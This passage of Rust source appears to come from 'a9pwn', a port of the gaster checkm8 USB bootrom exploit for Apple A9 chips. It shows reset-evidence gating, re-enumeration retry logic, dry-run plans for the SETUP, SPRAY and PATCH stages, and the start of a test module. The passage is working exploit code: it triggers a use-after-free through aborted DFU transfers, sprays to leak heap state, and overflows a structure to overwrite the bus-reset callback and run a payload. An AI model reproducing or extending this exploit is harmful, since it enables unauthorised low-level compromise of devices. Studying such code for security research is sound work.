/// * `Refuted` — the device was parked in `MANIFEST_WAIT_RESET` and still is:
///   positive evidence the reset did not take effect. Stop.
/// * `DriverCannotReset` — WinUSB cannot deliver a bus reset, or interface 0 was
///   never claimed so libusb skipped the call while returning success. Stop.
///
/// `--allow-winusb` keeps its documented role as the operator's override: its
/// purpose is to reproduce a failure mode deliberately, so it downgrades
/// `Stop` to `ContinueLoudly` rather than removing the evidence. It is **no
/// longer needed** to get past `Unverified` — that is the point of the fix.
pub fn reset_gate(evidence: ResetEvidence, allow_winusb: bool) -> ResetGate {
    match evidence {
        ResetEvidence::Delivered => ResetGate::Continue,
        ResetEvidence::Unverified => ResetGate::ContinueLoudly,
        ResetEvidence::Refuted | ResetEvidence::DriverCannotReset => {
            if allow_winusb {
                ResetGate::ContinueLoudly
            } else {
                ResetGate::Stop
            }
        }
    }
}

/// What to do when the `libusb_reset_device` **call itself failed**. Kept apart
/// from [`ResetGate`], which decides what a *completed* call's evidence means.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ResetDisposition {
    /// The device was absent: the exploit's own drop. Wait for it to come back
    /// (the round loop re-opens at the top of every iteration, bounded by
    /// [`OPEN_RETRY_BUDGET`]) and continue the run.
    KnownDrop,
    /// The call was refused with the device present: stop. This is the case the
    /// gate exists for, and it must not be weakened into "any failure".
    Stop,
    /// `--allow-winusb` was passed: the operator asked to reproduce a failure
    /// mode deliberately, so the run continues — loudly, never silently.
    StopOverridden,
}

/// The disposition for a **failed reset call**, from the libusb code alone.
///
/// Pure and total over `i32`, so the whole domain is pinned by a table test.
/// Only the two "device is not there" codes continue by themselves; every other
/// code still stops the run.
///
/// **The wrong fix this guards against.** MEASURED 2026-10-03: after the spray's
/// `DFU_CLRSTATUS` (`gaster.c:910`) the device leaves the bus and comes back by
/// itself, so the post-SPRAY reset returns `LIBUSB_ERROR_NOT_FOUND` and the run
/// stopped before PATCH. The tempting repair is to let "the reset call failed"
/// continue in general — which would turn the gate into one that never fires
/// and hide a genuinely resettable-host problem. The distinction is the whole
/// point: absent ⇒ the exploit's drop (absorbed by the reference,
/// `gaster.c:197-200`, `:1268`, `wait_usb_handle` `:202-218`); present ⇒ a host
/// capability problem (stop).
pub fn reset_failure_disposition(rc: i32, allow_winusb: bool) -> ResetDisposition {
    if reset_error_is_device_absent(rc) {
        ResetDisposition::KnownDrop
    } else if allow_winusb {
        ResetDisposition::StopOverridden
    } else {
        ResetDisposition::Stop
    }
}

/// The trace kind for a reset that failed because the device was absent.
///
/// Deliberately **not** [`kind::RESET`]: that kind counts as an attempt with no
/// evidence, and `Counters::resets_unrecorded` feeds the `RESET_NOT_DELIVERED`
/// verdict — so recording the exploit's own drop as a bare reset would blame the
/// host for it. This kind is recorded verbatim and counted by nothing, which is
/// what "its own evidence" means here.
pub const KIND_RESET_AFTER_DROP: &str = "reset_after_drop";

/// `bState` as the DFU 1.1 spec numbers it (the same labels `usb.rs:169-170`
/// uses): 0 appIDLE, 1 appDETACH, 2 dfuIDLE, 3 dfuDNLOAD-SYNC, 4 dfuDNBUSY,
/// 5 dfuDNLOAD-IDLE, 6 dfuMANIFEST-SYNC, 7 dfuMANIFEST, 8
/// dfuMANIFEST-WAIT-RESET, 9 dfuUPLOAD-IDLE, 10 dfuERROR.
///
/// The `3`/`4`/`10` rows are load-bearing for the `--probe-setup-state`
/// diagnostic: "still 5" (the ROM never registered the DNLOAD) versus "3/4" (it
/// did and is mid-transaction) versus "10" (it registered and rejected it) is the
/// entire result, so they must never render as "other". Pinned by
/// `the_setup_probe_state_table_is_pinned`.
fn dfu_state_label(s: u8) -> &'static str {
    match s {
        0 => "appIDLE",
        1 => "appDETACH",
        2 => "dfuIDLE",
        3 => "dfuDNLOAD-SYNC",
        4 => "dfuDNBUSY",
        5 => "dfuDNLOAD-IDLE",
        6 => "manifestSync",
        7 => "manifest",
        8 => "manifestWaitReset",
        9 => "dfuUPLOAD-IDLE",
        10 => "dfuERROR",
        _ => "other",
    }
}

/// The state pair as measured, never as assumed: `None` is *unread*.
pub fn dfu_state_pair(r: &ResetReport) -> String {
    let f = |s: Option<u8>| match s {
        Some(v) => format!("{v} ({})", dfu_state_label(v)),
        None => "unread".to_string(),
    };
    format!("DFU state {} -> {}", f(r.dfu_state_before), f(r.dfu_state_after))
}

/// One line naming every measured fact about one reset. Used for the predicate
/// detail, the tracer record and both messages below.
pub fn reset_facts(when: &str, after: &str, r: &ResetReport) -> String {
    format!(
        "when={when} after={after} evidence=\"{}\" rc={} capability=\"{}\" interface_claimed={} {} \
         micros={} {}",
        r.evidence.as_str(),
        r.libusb_rc,
        r.capability.as_str(),
        r.interface_claimed,
        dfu_state_pair(r),
        r.micros,
        r.note
    )
}

/// The warning line for a reset that continued without proving itself. Pure, so
/// its content is pinned by a test.
///
/// `after` is the stage whose attempt the reset followed. After PATCH the
/// consequence is different in kind — that reset is the *trigger* that runs the
/// overwritten `dfu_handle_bus_reset` (`gaster.c:1268`, HANDOFF §8.6) — so the
/// sentence says so instead of claiming a generic "continue".
pub fn reset_warning(when: &str, after: &str, r: &ResetReport) -> String {
    let tail = if after.eq_ignore_ascii_case("PATCH") {
        "After PATCH this reset is the TRIGGER that runs the overwritten \
         dfu_handle_bus_reset callback, so if the PWND marker is absent after the re-open, this \
         line is a candidate cause — and the marker, not this verdict, is the proof either way."
    } else {
        "gaster discards this result and resets unconditionally after every attempt \
         (gaster.c:197-200, :1268), so the run continues rather than stopping the experiment on a \
         failed reading. If the run fails later, read this line and the reset_unverified events \
         before blaming the exploit."
    };
    format!(
        "the {when} bus reset (after the {after} attempt) was issued but did not prove itself: \
         evidence \"{}\", {}. Not success, not failure — continuing. {tail}",
        r.evidence.as_str(),
        reset_facts(when, after, r)
    )
}

/// Which event the RESET stage may CLAIM — derived from its own bus-reset predicate
/// (instrument fix 4; review/07 finding 13). The DFU dance and the bus reset are two separate
/// measurements: `stage_pass` used to be claimed from the first while the second's
/// `bus_reset_delivered` predicate FAILed 350 times and PASSED 0 across the corpus (139
/// `stage_pass` RESET events against that). A PASS may not coexist with its own failed
/// predicate, so an unproven reset claims `stage_unproven` instead — the run's continue
/// semantics are unchanged, only the claim is.
pub fn reset_stage_event(delivered: bool, evidence: &str) -> (&'static str, String) {
    if delivered {
        (
            "stage_pass",
            format!("RESET — the DFU dance passed and the bus reset DELIVERED (evidence {evidence})"),
        )
    } else {
        (
            kind::STAGE_UNPROVEN,
            format!(
                "the DFU dance passed but the bus reset did not prove itself \
                 (bus_reset_delivered=FAIL, evidence {evidence}): this stage is UNPROVEN, not a \
                 pass — a stage_pass may not coexist with its own failed predicate (review/07 \
                 finding 13). Continuing per the reset gate; see the reset_unverified / \
                 bus_reset_not_proven events for the reset itself."
            ),
        )
    }
}

/// The abort sentence for a reset the gate refuses to continue past. Pure.
pub fn reset_stop_message(when: &str, after: &str, r: &ResetReport, allow_winusb: bool) -> String {
    let why = match r.evidence {
        ResetEvidence::Refuted => {
            "the device says the reset did not take effect (it was parked in manifestWaitReset and \
             still is), whatever libusb returned"
        }
        ResetEvidence::DriverCannotReset => {
            "the bound driver cannot deliver a host-initiated bus reset, so the reset this exploit \
             depends on is a no-op"
        }
        ResetEvidence::Delivered | ResetEvidence::Unverified => {
            "the reset evidence was neither positive nor overridable"
        }
    };
    format!(
        "the {when} bus reset (after the {after} attempt) was not delivered: {why}. Stop — {} \
         The reset is what both cleans the DFU state and, after PATCH, fires the overwritten \
         dfu_handle_bus_reset callback (gaster.c:1268), so continuing would be a different \
         experiment.{}",
        reset_facts(when, after, r),
        if allow_winusb {
            ""
        } else {
            " --allow-winusb overrides only to prove the failure."
        }
    )
}

/// Record one reset in the tracer, honestly.
///
/// The evidence is handed to the tracer **whole** — `Tracer::reset(evidence,
/// note)`, authorised by the Lead as the replacement for the old
/// `reset(bool, note)`. That signature exists precisely so the counters and the
/// verdict can tell `Unverified` from a pipe cycle; passing a `bool` here would
/// reproduce the collapse this crate was built to avoid, and would make
/// `verdict.rs` step 1 answer `NO_RESET_CAPABILITY` for a perfectly good libusbK
/// driver (`verdict.rs:196-201`).
///
/// The gate itself does not depend on this call — it reads
/// `report.evidence` directly — so the two concerns stay separable.
fn record_reset(tracer: &mut Tracer, when: &str, after: &str, r: &ResetReport) {
    tracer.reset(r.evidence, &reset_facts(when, after, r));
}

/// The bus reset after an attempt (gaster.c:1268), with the report read rather
/// than trusted (`windows_winusb.c:3419` returns success for a pipe cycle).
///
/// One function for both the round loop and the single-stage path, so the two
/// cannot drift apart — B1 was the same wrong condition written twice
/// (`stages.rs:1555` and `:1840` before the fix).
fn reset_after_attempt(
    usb: &mut Transport,
    tracer: &mut Tracer,
    opts: &RunOptions,
    when: &str,
    after: &str,
) -> Result<Option<ResetReport>, RunOutcome> {
    // `Some(report)` = the bus reset was ATTEMPTED and its evidence measured (the caller may
    // derive the RESET stage's claim from `bus_reset_delivered` — instrument fix 4);
    // `None` = no evidence exists (device absent / the call itself failed).
    let report = match usb.reset_call() {
        ResetCall::Report(r) => r,
        ResetCall::RefusedAbsent { rc, micros, note } => {
            // The known drop: the exploit's own DFU_CLRSTATUS took the device off
            // the bus (gaster.c:910), and the reference absorbs it — it discards
            // every reset result (:197-200, :1268) and `wait_usb_handle`
            // (:202-218) loops until a handle appears again. This must never be
            // attributed to the host's reset capability, so it is recorded under
            // its own kind, which no counter claims, and the run continues; the
            // next round's re-open is the bounded wall-clock wait.
            debug_assert_eq!(
                reset_failure_disposition(rc, opts.allow_winusb),
                ResetDisposition::KnownDrop,
                "RefusedAbsent must mean the device was absent"
            );
            tracer.event(
                KIND_RESET_AFTER_DROP,
                Some(Stage::Reset),
                &format!(
                    "when={when} after={after}: the reset call failed because the device was \
                     ABSENT (rc={rc}, {micros} us) — the known post-CLR_STATUS drop \
                     (gaster.c:910), which the reference absorbs (gaster.c:197-200, :1268; \
                     wait_usb_handle :202-218). CONTINUING; the next round re-opens with a \
                     wall-clock budget and records the absence. {note}"
                ),
            );
            println!(
                "  RESET: device absent (the known drop, rc={rc}, {micros} us) — continuing; the \
                 next re-open waits for re-enumeration"
            );
            return Ok(None);
        }
        ResetCall::RefusedPresent { rc, micros, note } => {
            // The call failed with the device present: a third outcome, counted
            // as an attempt only (`trace::kind::RESET`), never as real and never
            // as a pipe cycle. gaster ignores this and continues; we stop by
            // default — unless the operator asked for the failure deliberately.
            tracer.event(
                kind::RESET,
                Some(Stage::Reset),
                &format!(
                    "when={when} after={after}: the reset call failed with the device present \
                     (rc={rc}, {micros} us): {note}"
                ),
            );
            return match reset_failure_disposition(rc, opts.allow_winusb) {
                ResetDisposition::Stop => Err(RunOutcome::Aborted(format!(
                    "the {when} bus reset (after the {after} attempt) was REFUSED while the \
                     device was present: {note} checkm8 needs a real reset after every attempt \
                     (gaster.c:1268); --allow-winusb overrides only to prove the failure."
                ))),
                ResetDisposition::StopOverridden => {
                    // `--allow-winusb` is the operator asking to reproduce a
                    // failure on purpose. The trace records it either way; the
                    // console must not be the quiet one, or a run that only
                    // continued because of the override looks like a clean one.
                    println!(
                        "  RESET: WARNING - the {when} bus reset (after the {after} attempt) was \
                         REFUSED with the device present (rc={rc}); continuing ONLY because \
                         --allow-winusb was passed"
                    );
                    Ok(None)
                }
                ResetDisposition::KnownDrop => unreachable!("the code above proves absence"),
            };
        }
    };

    let detail = reset_facts(when, after, &report);
    tracer.predicate(
        Stage::Reset,
        "bus_reset_delivered",
        report.bus_reset_delivered,
        &detail,
    );
    record_reset(tracer, when, after, &report);

    match reset_gate(report.evidence, opts.allow_winusb) {
        ResetGate::Continue => Ok(Some(report)),
        ResetGate::ContinueLoudly => {
            let warning = reset_warning(when, after, &report);
            tracer.event(
                "bus_reset_not_proven",
                Some(Stage::Reset),
                &format!("{warning} [{}]", report.evidence.as_str()),
            );
            println!("  RESET: WARNING - {}", one_line(&warning));
            Ok(Some(report))
        }
        ResetGate::Stop => Err(RunOutcome::Aborted(reset_stop_message(
            when,
            after,
            &report,
            opts.allow_winusb,
        ))),
    }
}

struct Session {
    cfg: SocConfig,
    built: BuiltPayload,
}

/// How long to keep waiting for a re-enumerating device. **Wall clock**, not an
/// attempt count: the drop we measure costs 435 ms (MEASURED 2026-10-03, the
/// post-`CLR_STATUS` return, at a new address), and LINUX-HANDOFF §4.8 records
/// that "19 open attempts" was really 285-292 ms — a count is not a duration and
/// cannot be compared with either number. Three seconds is ~7x the measured
/// return time and matches the bounded re-open in `main.rs`.
pub const OPEN_RETRY_BUDGET: Duration = Duration::from_millis(3_000);

/// Safety valve for a hot loop that fails *instantly* (a permissions error, say):
/// the budget above is the real bound; this only stops a spin from becoming
/// millions of calls to `Transport::open_first_dfu`.
pub const OPEN_RETRY_TRIES: u32 = 10_000;

/// Pure: may another open attempt be made? Split out so the **wall-clock** rule
/// (E5-3: durations, not attempt counts) is pinned without hardware.
pub fn open_retry_allowed(elapsed: Duration, attempts: u32) -> bool {
    elapsed < OPEN_RETRY_BUDGET && attempts < OPEN_RETRY_TRIES
}

/// The longest a single between-attempt pause may be, however the operator
/// configured `--usb-timeout-ms`.
///
/// **Why 50 ms.** A re-enumeration after the spray's `DFU_CLRSTATUS` takes
/// ~435 ms (MEASURED 2026-10-03, and 400.8/268.0 ms in the run that pwned), so
/// the pause has to be small enough that *several* attempts land inside
/// [`OPEN_RETRY_BUDGET`] even in the worst case: 3 s / 50 ms = 60 attempts, an
/// attempt every 50 ms across a 435 ms absence. `main.rs`'s own re-open loop
/// pauses 50 ms for the same reason.
pub const OPEN_RETRY_MAX_PAUSE: Duration = Duration::from_millis(50);

/// Pure: the pause before the next open attempt — the configured interval,
/// never longer than [`OPEN_RETRY_MAX_PAUSE`], and never past the budget.
///
/// **The defect this exists for** (reviewer, MEASURED 2026-10-03): the pause is
/// `--usb-timeout-ms` (default 5 ms; `main.rs:133` validates only a lower
/// bound). With the default the loop makes ~600 attempts inside the 3 s budget,
/// but with `--usb-timeout-ms 5000` ONE sleep crosses the whole budget and the
/// loop makes exactly **one** attempt — so the 435 ms re-enumeration would
/// never be caught and a healthy device would read as absent. Clamping to the
/// budget alone would not fix that (sleep == budget still exits after one
/// attempt); the cap is what guarantees the budget admits many attempts.
pub fn open_retry_pause(configured: Duration, elapsed: Duration) -> Duration {
    configured
        .min(OPEN_RETRY_MAX_PAUSE)
        .min(OPEN_RETRY_BUDGET.saturating_sub(elapsed))
}

/// Pure: the line recorded when a re-enumerating device came back.
pub fn open_retry_ok_note(attempt: u32, elapsed: Duration) -> String {
    format!(
        "device opened on attempt {attempt} after {:.3} ms of wall-clock absence (gaster waits \
         forever here; this wait was bounded by {OPEN_RETRY_BUDGET:?})",
        elapsed.as_secs_f64() * 1000.0
    )
}

/// Pure: the line recorded when it never came back.
pub fn open_retry_exhausted_note(elapsed: Duration, attempts: u32, last: &str) -> String {
    format!(
        "no DFU device after {:.0} ms of wall-clock waiting ({attempts} open attempt(s), budget \
         {OPEN_RETRY_BUDGET:?}): {last}",
        elapsed.as_secs_f64() * 1000.0
    )
}

fn open_with_retry(opts: &RunOptions, tracer: &mut Tracer) -> Result<Transport, String> {
    let configured = Duration::from_millis(opts.timeout_ms() as u64);
    let started = Instant::now();
    let mut last = String::from("no attempt made");
    let mut attempts = 0u32;

    while open_retry_allowed(started.elapsed(), attempts) {
        attempts += 1;
        match Transport::open_first_dfu() {
            Ok(t) => {
                if attempts > 1 {
                    tracer.event(
                        "open_retry_ok",
                        None,
                        &open_retry_ok_note(attempts, started.elapsed()),
                    );
                }
                return Ok(t);
            }
            Err(e) => last = e,
        }
        if open_retry_allowed(started.elapsed(), attempts) {
            sleep(open_retry_pause(configured, started.elapsed()));
        }
    }

    Err(open_retry_exhausted_note(
        started.elapsed(),
        attempts,
        &last,
    ))
}

fn print_stage_summary(tracer: &Tracer, label: &str) {
    let c = tracer.counters();
    let transfers = c.ok + c.stall + c.timeout + c.cancelled + c.nodevice + c.err;
    if transfers == 0 && c.setup_attempts == 0 && c.resets_attempted == 0 {
        return;
    }
    println!();
    println!("  tracer summary ({label}):");
    for line in tracer.summary_lines() {
        println!("    {line}");
    }
}

// ---------------------------------------------------------------------------
// Dry run: build everything, send nothing, open nothing
// ---------------------------------------------------------------------------

fn dry_run_all(opts: &RunOptions) -> RunOutcome {
    println!("a9pwn DRY RUN - building bytes only. No USB device is opened, nothing is sent.");
    if let Err(e) = payload::verify_blob_hashes() {
        println!("  BLOB VERIFICATION FAILED: {e}");
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }
    println!("  blob sha256  : both vendored blobs verified");
    let mut built_ok = 0usize;
    println!("  handler      : {} (--handler)", opts.handler.name());
    for cfg in all_configs() {
        // Honour the selected handler: a dry run that prints the stock plan while `run` would
        // install the read-window handler is a flag that half-works, which is its own failure.
        match payload::build_payload_variant(
            cfg,
            PayloadKind::A9,
            opts.handler,
            if opts.mailbox_relocated {
                crate::config::S1_MAILBOX_BASE
            } else {
                cfg.insecure_memory_base
            },
        ) {
            Ok(built) => {
                print_plan(cfg, PayloadKind::A9, &built);
                built_ok += 1;
            }
            Err(e) => println!("  config {} (0x{:04X}): BUILD FAILED: {e}", cfg.name, cfg.cpid),
        }
    }
    println!();
    println!(
        "  dry run: {built_ok} payload(s) built, 0 transfers issued, no device opened. \
         (usb_timeout={}ms leak_windex=0x{:X} rounds={})",
        opts.usb_timeout_ms, opts.leak_windex, opts.max_rounds
    );
    RunOutcome::Aborted(format!(
        "dry_run: built {built_ok} payload(s); nothing was sent and no device was opened"
    ))
}

fn dry_run_stage(stage: Stage, opts: &RunOptions) -> RunOutcome {
    println!(
        "a9pwn DRY RUN - stage {} only. No USB device is opened, nothing is sent.",
        stage.name()
    );
    if let Err(e) = payload::verify_blob_hashes() {
        println!("  BLOB VERIFICATION FAILED: {e}");
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }
    println!("  blob sha256  : both vendored blobs verified");

    match stage {
        Stage::Reset => {
            println!();
            println!("  RESET plan (gaster.c:836-845):");
            println!("    1. DNLOAD {DFU_FILE_SUFFIX_LEN} zero bytes  -> expect OK/{DFU_FILE_SUFFIX_LEN}");
            println!("    2. DNLOAD 0 bytes                  -> expect OK/0");
            println!("    3. GET_STATUS                      -> expect OK, state {DFU_STATE_MANIFEST_SYNC}");
            println!("    4. GET_STATUS                      -> expect OK, state {DFU_STATE_MANIFEST}");
            println!("    5. GET_STATUS                      -> expect OK, state {DFU_STATE_MANIFEST_WAIT_RESET}");
            println!("    6. DNLOAD {EP0_MAX_PACKET_SZ} zero bytes -> expect OK/{EP0_MAX_PACKET_SZ}");
            println!("    on failure: CLR_STATUS, then a bus reset is still attempted");
        }
        Stage::Setup => {
            let t = opts.timeout_ms();
            let m = opts.abort_timeout_min_ms.min(t);
            let first = initial_abort_window(t, m);
            let seq = sweep_windows(t, m, 8);
            println!();
            println!("  SETUP plan (gaster.c:848-860):");
            println!(
                "    abort window = {t}ms - 1 = {first}ms, cycle span {} + abort_min {m}ms",
                window_span(t, m)
            );
            println!("    first windows: {seq:?}");
            for cfg in all_configs() {
                println!(
                    "    config {} (0x{:04X}): overwrite_pad = 0x{:X} ({} bytes)",
                    cfg.name, cfg.cpid, cfg.overwrite_pad, cfg.overwrite_pad
                );
                println!(
                    "      pad request = overwrite_pad - delivered, sent as bm=0 b=0 wValue=0 wIndex=0"
                );
                println!(
                    "      pad timeout = {}ms (gaster's usb_timeout by default; ours to move — a \
                     pad STALL at 20-40ms is the device's EP0 watchdog, NOT evidence of \
                     corruption)",
                    pad_timeout(opts)
                );
                println!("      PASS CONDITION: STALL on the pad request (gaster.c:853), not OK, not a timeout");
            }
            println!(
                "    budget: {} attempts / {} ms",
                opts.setup_budget.max_attempts, opts.setup_budget.max_millis
            );
        }
        Stage::Spray => {
            println!();
            println!("  SPRAY plan (gaster.c:896-918), A9 branch:");
            println!("    loop: (bm=2,b=3,wValue=0,wIndex=0x80) STALL && leak(len 0x{EP0_MAX_PACKET_SZ:X}) && no-leak(len 0x{:X})", 3 * EP0_MAX_PACKET_SZ + 1);
            println!("    leak wValue = (3 << 8) | iSerialNumber, wIndex = 0x{:X}", opts.leak_windex);
            println!("    then CLR_STATUS with length 0x{:X}", 3 * EP0_MAX_PACKET_SZ + 1);
            println!("    cap: the run-level budget, {} iterations / {} ms (the reference is unbounded)", opts.setup_budget.max_attempts, opts.setup_budget.max_millis);
        }
        Stage::Patch => {
            println!("    handler: {} (--handler)", opts.handler.name());
            for cfg in all_configs() {
                match payload::build_payload_variant(
            cfg,
            PayloadKind::A9,
            opts.handler,
            if opts.mailbox_relocated {
                crate::config::S1_MAILBOX_BASE
            } else {
                cfg.insecure_memory_base
            },
        ) {
                    Ok(built) => print_plan(cfg, PayloadKind::A9, &built),
                    Err(e) => println!("  {}: BUILD FAILED: {e}", cfg.name),
                }
            }
            println!();
            println!(
                "  PATCH plan (gaster.c:1209-1223): overflow {} bytes as bm=2 b=3 wValue=0 \
                 wIndex=0x80 (STALL is success), then the blob in 0x{DFU_MAX_TRANSFER_SZ:X} chunks, \
                 then DNLOAD {DFU_FILE_SUFFIX_LEN} + DNLOAD 0 + the MANIFEST walk.",
                OVERWRITE_STRUCT_SIZE
            );
        }
        Stage::Pwned => {}
    }

    println!();
    println!("  dry run: nothing was sent and no device was opened.");
    RunOutcome::Aborted(format!(
        "dry_run: stage {} planned; nothing was sent and no device was opened",
        stage.name()
    ))
}

fn print_plan(cfg: &SocConfig, kind: PayloadKind, built: &BuiltPayload) {
    println!();
    println!(
        "  config        : {} ({kind:?}) cpid=0x{:04X} cprv=0x{:02X}",
        cfg.name, cfg.cpid, cfg.cprv
    );
    println!(
        "  overwrite_pad : 0x{:X} ({})   insecure_base 0x{:X}",
        cfg.overwrite_pad, cfg.overwrite_pad, cfg.insecure_memory_base
    );
    println!("  payload       : {} bytes", built.blob.len());
    println!(
        "  overwrite     : {} bytes (callback at offset {})",
        built.overwrite.len(),
        payload::OVERWRITE_CALLBACK_OFF
    );
    println!("  blob sha256   : {}", built.blob_sha256);
    println!();
    println!("  {:<6} {:<6} {:<42} value", "off", "len", "field");
    for f in &built.fields {
        println!(
            "  0x{:03X}  {:<6} {:<42} 0x{:016X}",
            f.off, f.len, f.label, f.value
        );
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -- the sweep is a real sweep -----------------------------------------

    /// gaster.c:849 — the first window is `usb_timeout - 1`, i.e. 4 ms at the
    /// default 5 ms timeout, not 0.
    #[test]
    fn sweep_starts_at_usb_timeout_minus_one() {
        assert_eq!(initial_abort_window(5, 0), 4);
        assert_eq!(initial_abort_window(1, 0), 0);
        assert_eq!(initial_abort_window(0, 0), 0, "a nonsense timeout must not panic");
    }

    /// The advance formula, `(t + 1) % (usb_timeout - abort_min + 1) + abort_min`
    /// (gaster.c:857), for the default options: 0,1,2,3,4,5,0.
    #[test]
    fn advance_formula_is_gaster_857() {
        let seq: Vec<u32> = (0..=5).map(|t| advance_abort_window(t, 5, 0)).collect();
        assert_eq!(seq, vec![1, 2, 3, 4, 5, 0]);
        // And applied repeatedly from 0 it is the acceptance sequence.
        let mut w = 0;
        let mut seen = vec![w];
        for _ in 0..6 {
            w = advance_abort_window(w, 5, 0);
            seen.push(w);
        }
        assert_eq!(seen, vec![0, 1, 2, 3, 4, 5, 0]);
        assert_eq!(window_span(5, 0), 6);
    }

    /// The windows a run actually exercises must all be distinct, and must cover
    /// every value in the cycle. This is the property `a9ctl` did not have: its
    /// six labels all cancelled at >= 5 ms because the pump interval was 5 ms.
    #[test]
    fn sweep_exercises_every_distinct_window() {
        let seq = sweep_windows(5, 0, 12);
        assert_eq!(seq[..6], [4, 5, 0, 1, 2, 3]);
        assert_eq!(seq[6..], [4, 5, 0, 1, 2, 3]);
        let mut distinct = seq[..6].to_vec();
        distinct.sort_unstable();
        assert_eq!(distinct, vec![0, 1, 2, 3, 4, 5]);
    }

    #[test]
    fn abort_min_raises_the_floor() {
        assert_eq!(window_span(5, 2), 4);
        // start at usb_timeout-1 = 4, then gaster.c:857's (t+1) % 4 + 2:
        // 4 -> 3 -> 2 -> 5 -> 4
        assert_eq!(sweep_windows(5, 2, 5), vec![4, 3, 2, 5, 4]);
        // abort_min above usb_timeout cannot divide by zero or escape the cycle.
        assert_eq!(window_span(3, 9), 1);
        assert_eq!(advance_abort_window(3, 3, 9), 3);
    }

    /// The degenerate case the Lead called out: `--abort-min-ms` equal to
    /// `--usb-timeout-ms` collapses gaster.c:857's modulus to 1, so the sweep is
    /// one experiment. gaster inherits it (gaster.c:1635-1638 only rejects
    /// abort_min *greater* than usb_timeout), so we must not clamp it away — we
    /// must make it visible.
    #[test]
    fn degenerate_sweep_is_detected_and_said_once() {
        // gaster.c:849 still runs one attempt at usb_timeout-1 before the pin.
        assert_eq!(initial_abort_window(5, 5), 4);
        assert_eq!(window_span(5, 5), 1);
        assert_eq!(sweep_windows(5, 5, 4), vec![4, 5, 5, 5]);

        let mut s = SetupStats::new(0x500, 5, 5, 5);
        assert!(s.degenerate);
        s.attempts = 1;
        s.note_window(4);
        let first = s.frozen_sweep_notice().expect("must warn");
        assert!(first.contains("NOT sweeping"), "{first}");
        assert!(first.contains("abort_min == usb_timeout"), "{first}");
        assert!(first.contains("gaster.c:857"), "{first}");
        assert!(
            s.frozen_sweep_notice().is_none(),
            "the warning must be said once, not per attempt"
        );
        assert!(s.summary().contains("DEGENERATE"), "{}", s.summary());
    }

    #[test]
    fn healthy_sweep_never_warns() {
        let mut s = SetupStats::new(0x500, 5, 0, 5);
        assert!(!s.degenerate);
        for (i, w) in [4u32, 5, 0, 1, 2, 3, 4, 5].iter().enumerate() {
            s.attempts = i as u64 + 1;
            s.note_window(*w);
            assert!(
                s.frozen_sweep_notice().is_none(),
                "a varying sweep must not warn at attempt {}",
                s.attempts
            );
        }
    }

    /// If the window somehow stops varying with a span > 1, that is a bug in the
    /// advance (the a9ctl failure mode) and it must still be reported.
    #[test]
    fn a_span_above_one_that_still_does_not_vary_is_reported() {
        let mut s = SetupStats::new(0x500, 5, 0, 5);
        assert!(!s.degenerate);
        s.attempts = 1;
        s.note_window(4);
        assert!(s.frozen_sweep_notice().is_none(), "one attempt proves nothing");
        s.attempts = 8; // more attempts than the cycle has windows
        let msg = s.frozen_sweep_notice().expect("must warn");
        assert!(msg.contains("8 attempt(s)"), "{msg}");
        assert!(msg.contains("1 distinct window(s)"), "{msg}");
    }

    #[test]
    fn an_immediate_return_is_flagged_in_the_attempt_line() {
        let mut s = SetupStats::new(0x500, 5, 0, 5);
        s.attempts = 1;
        let abort = XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: DFU_MAX_TRANSFER_SZ,
            status: XferStatus::Cancelled,
            transferred: 0,
            requested: DFU_MAX_TRANSFER_SZ as usize,
            micros: 12,
            libusb_rc: -2,
            abort_after_ms: Some(4),
        };
        let line = s.attempt_line(&abort, 4, Some(0x500), None);
        assert!(line.contains("far_short_of_the_4ms_window"), "{line}");
        assert!(line.contains("sweep=ok"), "{line}");
        assert!(line.contains("pad_status=NOT_SENT"), "{line}");
    }

    /// gaster reaps a transfer for *every* terminal status (`gaster.c:220-223`,
    /// `:282`), so `TRANSFER_ERROR` still yields a pad request at `:853`. Only a
    /// device that is gone is excluded.
    #[test]
    fn abort_completed_mirrors_gasters_wrapper() {
        let base = |status: XferStatus| XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: DFU_MAX_TRANSFER_SZ,
            status,
            transferred: 0,
            requested: DFU_MAX_TRANSFER_SZ as usize,
            micros: 4000,
            libusb_rc: -2,
            abort_after_ms: Some(4),
        };
        for s in [
            XferStatus::Ok,
            XferStatus::Stall,
            XferStatus::Timeout,
            XferStatus::Cancelled,
            XferStatus::Error,
        ] {
            assert!(abort_completed(&base(s)), "{s} was reaped");
        }
        assert!(!abort_completed(&base(XferStatus::NoDevice)));
    }

    #[test]
    fn a_refused_transfer_is_distinguishable_from_a_reaped_error() {
        let reaped = XferResult {
            seq: 1,
            bm_request_type: 0x21,
            b_request: DFU_DNLOAD,
            w_value: 0,
            w_index: 0,
            w_length: DFU_MAX_TRANSFER_SZ,
            status: XferStatus::Error,
            transferred: 0,
            requested: DFU_MAX_TRANSFER_SZ as usize,
            micros: 4012,
            libusb_rc: -1,
            abort_after_ms: Some(4),
        };
        assert!(abort_completed(&reaped) && !abort_was_refused(&reaped));

        // The transport's refused/poisoned shape: never submitted, so no window.
        let refused = XferResult {
            status: XferStatus::Error,
            micros: 0,
            abort_after_ms: None,
            ..reaped
        };
        assert!(abort_completed(&refused), "an Error is still a reaped transfer");
        assert!(abort_was_refused(&refused), "and it is recognisable as refused");
    }

    /// The pad predicate: sent when the aborted transfer delivered *fewer* than
    /// `overwrite_pad`, with the length gaster computes.
    #[test]
    fn pad_predicate_matches_gaster_853() {
        assert_eq!(pad_request_len(0x500, 0), Some(0x500));
        assert_eq!(pad_request_len(0x500, 0x4FF), Some(1));
        assert_eq!(pad_request_len(0x500, 0x500), None);
        assert_eq!(pad_request_len(0x500, 0x800), None);
    }

    /// The gap the analyst named (Q1/Q2): `pad_predicate_matches_gaster_853`
    /// pins only the **length** half of the predicate, so the STALL requirement
    /// — which *is* SETUP's success signal and the proof HANDOFF §6.3 exists to
    /// produce — was pinned by inspection alone. This pins the whole gate, and
    /// `stage_setup` now calls it.
    #[test]
    fn the_setup_pass_condition_is_gaster_853_whole() {
        let pad = |status: XferStatus| XferResult {
            seq: 9,
            bm_request_type: 0,
            b_request: 0,
